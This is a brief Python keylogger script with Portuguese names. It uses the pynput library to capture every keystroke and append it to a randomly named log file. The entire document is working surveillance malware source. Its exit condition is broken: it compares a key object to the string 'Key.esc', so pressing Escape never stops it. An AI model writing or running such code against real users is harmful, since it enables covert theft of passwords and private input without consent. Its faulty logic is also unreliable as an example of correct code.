from pynput.keyboard import Listener
import sys
import random

numero_log = random.randint(0,1000)
log = f'yek{numero_log}.txt'

def escreve_key(key):
    with open(f'{log}','a') as file:
        file.write(f'{str(key)} \n')
    if key == 'Key.esc':
        sys.exit()
        
with Listener (on_press=escreve_key) as logs:
    logs.join()